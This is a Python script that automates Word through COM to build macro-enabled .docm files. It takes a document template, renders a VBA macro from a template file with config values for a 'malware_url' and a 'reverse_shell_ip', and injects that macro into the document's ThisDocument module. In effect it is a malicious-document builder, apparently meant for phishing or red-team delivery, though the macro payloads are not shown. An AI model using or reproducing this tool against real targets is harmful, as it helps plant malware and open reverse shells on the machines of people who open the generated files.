import win32com.client as win32
import os
import sys
import yaml
from jinja2 import Template

cfg = None
parent_dir = os.path.dirname(os.path.abspath(__file__))
config_file = os.path.join(parent_dir, "config.yml")
template_dir = os.path.join(parent_dir, "templates")
output_dir = os.path.join(parent_dir, "output")

with open(config_file, "r") as stream:
    try:
        cfg = yaml.safe_load(stream)
    except yaml.YAMLError as exc:
        print(f"Error reading configuration from '{config_file}': {exc}")
        sys.exit(1)


def load_word_template(template_path):
    app = win32.gencache.EnsureDispatch('Word.Application')
    app.Visible = False
    doc = app.Documents.Open(template_path)
    return app, doc


def insert_macro_from_file(macro_path, target_doc):
    with open(macro_path, 'r') as macro_file:
        macro_template = Template(macro_file.read())

    # Add the value from cfg["app"]["malware_url"] to the template
    rendered_macro = macro_template.render(
        malware_url=cfg["app"]["macros"]["malware_url"],
        reverse_shell_ip = cfg["app"]["macros"]["reverse_shell_ip"])

    target_vba_project = target_doc.VBProject
    target_vba_project.VBComponents(
        "ThisDocument").CodeModule.AddFromString(rendered_macro)


def main(template_id, macro_id):
    # Get template path from config using template_id
    template_name = cfg['templates']["ms_office"]['word'][template_id]
    template_path = os.path.join(template_dir, "files", "ms_office", template_name)

    # Load the Word template (template with the associated macro)
    word_app, template_doc = load_word_template(template_path)

    # Save the new document in the output folder
    new_doc_path = os.path.join(output_dir, os.path.splitext(
        os.path.basename(template_name))[0])
    new_doc_path += ".docm"
    template_doc.SaveAs(new_doc_path, FileFormat=13)
    template_doc.Close()

    # Open the newly created document
    new_doc = word_app.Documents.Open(new_doc_path)

    # Insert macro from text file into the new document
    macro_name = cfg['macros']["ms_office"][macro_id]
    macro_path = os.path.join(template_dir, "macros", "ms_office", macro_name)
    insert_macro_from_file(macro_path, new_doc)

    # Save the output document with the macro inserted
    new_doc.Save()

    # Close the documents
    new_doc.Close()
    word_app.Quit()


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python script.py <template_id> <macro_id>")
        sys.exit(1)

    template_id = int(sys.argv[1])
    macro_id = int(sys.argv[2])

    main(template_id, macro_id)
